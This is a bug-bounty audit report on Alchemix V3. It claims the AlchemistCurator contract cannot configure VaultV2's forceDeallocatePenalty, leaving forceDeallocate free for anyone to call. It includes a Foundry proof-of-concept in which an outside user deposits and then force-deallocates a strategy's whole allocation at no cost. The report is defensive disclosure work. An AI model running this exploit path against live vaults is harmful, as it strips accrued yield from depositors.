# 57189 sc high alchemistcurator contract not implement setforcedeallocatepenalty

**Submitted on Oct 24th 2025 at 08:10:16 UTC by @ox9527 for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #57189
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistCurator.sol>
* **Impacts:**
  * Theft of unclaimed yield

## Description

## Brief/Intro

The `AlchemistCurator` contract is intended to act as the curator for `VaultV2` (Morpho VaultV2). However, the `setForceDeallocatePenalty` function in `VaultV2` is not implemented.

`setForceDeallocatePenalty` is supposed to be timelocked, meaning its data can only be submitted via `VaultV2::submit()`, and `submit()` can only be called by the curator.

If the `forceDeallocatePenalty` for a specific adapter is not configured, anyone can call `VaultV2::forceDeallocate()` without incurring any penalty. Consequently, anyone can deallocate assets from any adapter, which may result in the contract losing accrued yield.

## Vulnerability Details

VaultV2.sol::setForceDeallocatePenalty() is supposed to be timelocked

```solidity
    function setForceDeallocatePenalty(address adapter, uint256 newForceDeallocatePenalty) external {
        timelocked(); <@
        require(newForceDeallocatePenalty <= MAX_FORCE_DEALLOCATE_PENALTY, ErrorsLib.PenaltyTooHigh());
        forceDeallocatePenalty[adapter] = newForceDeallocatePenalty;
        emit EventsLib.SetForceDeallocatePenalty(adapter, newForceDeallocatePenalty);
    }
```

VaultV2.sol::submit() is only called by curator

```solidity
    function submit(bytes calldata data) external {
        require(msg.sender == curator, ErrorsLib.Unauthorized()); <@
        require(executableAt[data] == 0, ErrorsLib.DataAlreadyPending());

        bytes4 selector = bytes4(data);
        uint256 _timelock =
            selector == IVaultV2.decreaseTimelock.selector ? timelock[bytes4(data[4:8])] : timelock[selector];
        executableAt[data] = block.timestamp + _timelock;
        emit EventsLib.Submit(selector, data, executableAt[data]);
    }
```

## Impact Details

contract lost of yield

## References

## Proof of Concept

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Test} from "forge-std/Test.sol";
import {VaultV2} from "../../lib/vault-v2/src/VaultV2.sol";
import {IVaultV2} from "../../lib/vault-v2/src/interfaces/IVaultV2.sol";
import {TestYieldToken} from "./mocks/TestYieldToken.sol";
import {TestERC20} from "./mocks/TestERC20.sol";
import {TokenUtils} from "../libraries/TokenUtils.sol";
import {MockYieldToken} from "./mocks/MockYieldToken.sol";
import {IMockYieldToken} from "./mocks/MockYieldToken.sol";
import {MYTTestHelper} from "./libraries/MYTTestHelper.sol";
import {MockMYTStrategy} from "./mocks/MockMYTStrategy.sol";
import {AlchemistAllocator} from "../AlchemistAllocator.sol";
import {IAllocator} from "../interfaces/IAllocator.sol";
import {IMYTStrategy} from "../interfaces/IMYTStrategy.sol";
import "forge-std/console2.sol";
contract MockAlchemistAllocator is AlchemistAllocator {
    constructor(address _myt, address _admin, address _operator) AlchemistAllocator(_myt, _admin, _operator) {}
}

contract AlchemistAllocatorTest is Test {
    using MYTTestHelper for *;

    MockAlchemistAllocator public allocator;
    VaultV2 public vault;
    address public admin = address(0x2222222222222222222222222222222222222222);
    address public operator = address(0x3333333333333333333333333333333333333333);
    address public curator = address(0x8888888888888888888888888888888888888888);
    address public user1 = address(0x5555555555555555555555555555555555555555);
    address public mockVaultCollateral = address(new TestERC20(100e18, uint8(18)));
    address public mockStrategyYieldToken = address(new MockYieldToken(mockVaultCollateral));
    uint256 public defaultStrategyAbsoluteCap = 200 ether;
    uint256 public defaultStrategyRelativeCap = 1e18; // 100%
    MockMYTStrategy public mytStrategy;

    function setUp() public {
        vm.startPrank(admin);
        vault = MYTTestHelper._setupVault(mockVaultCollateral, admin, curator);
        mytStrategy = MYTTestHelper._setupStrategy(address(vault), mockStrategyYieldToken, admin, "MockToken", "MockTokenProtocol", IMYTStrategy.RiskClass.LOW);
        allocator = new MockAlchemistAllocator(address(vault), admin, operator);
        vm.stopPrank();
        vm.startPrank(curator);
        _vaultSubmitAndFastForward(abi.encodeCall(IVaultV2.setIsAllocator, (address(allocator), true)));
        vault.setIsAllocator(address(allocator), true);
        _vaultSubmitAndFastForward(abi.encodeCall(IVaultV2.addAdapter, address(mytStrategy)));
        vault.addAdapter(address(mytStrategy));
        // bytes memory idData = abi.encode("MockTokenProtocol", address(mytStrategy));
        bytes memory idData = mytStrategy.getIdData();
        _vaultSubmitAndFastForward(abi.encodeCall(IVaultV2.increaseAbsoluteCap, (idData, defaultStrategyAbsoluteCap)));
        vault.increaseAbsoluteCap(idData, defaultStrategyAbsoluteCap);
        _vaultSubmitAndFastForward(abi.encodeCall(IVaultV2.increaseRelativeCap, (idData, defaultStrategyRelativeCap)));
        vault.increaseRelativeCap(idData, defaultStrategyRelativeCap);
        vm.stopPrank();
    }

    function test_POC_14() public {
        address alice = address(0x1001);
        _magicDepositToVault(address(vault), alice, 150 ether);

        vm.startPrank(admin);
        bytes32 allocationId = mytStrategy.adapterId();
        allocator.allocate(address(mytStrategy), 10 ether);
        vm.stopPrank();

        uint256 capAfterAllocate = IVaultV2(address(vault)).allocation(allocationId);
        assert(capAfterAllocate == 10e18);

        address bob = address(0x1002);
        deal(address(mockVaultCollateral), bob, 10e18);
        vm.startPrank(bob);
        TokenUtils.safeApprove(address(mockVaultCollateral), address(vault), 10e18);
        IVaultV2(address(vault)).deposit(10e18, bob);

        console2.log("shares before:",vault.balanceOf(bob));

        IVaultV2(address(vault)).forceDeallocate(address(mytStrategy),abi.encode(10e18),10e18,bob);

        uint256 capAfterForceDeallocate = IVaultV2(address(vault)).allocation(allocationId);
        assert(capAfterForceDeallocate == 0);

        console2.log("shares after:",vault.balanceOf(bob));
    }
```

Out:

```shell
[PASS] test_POC_14() (gas: 966325)
Logs:
  shares before: 10000000000000000000
  shares after: 10000000000000000000

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 9.65ms (3.13ms CPU time)

Ran 1 test suite in 147.63ms (9.65ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
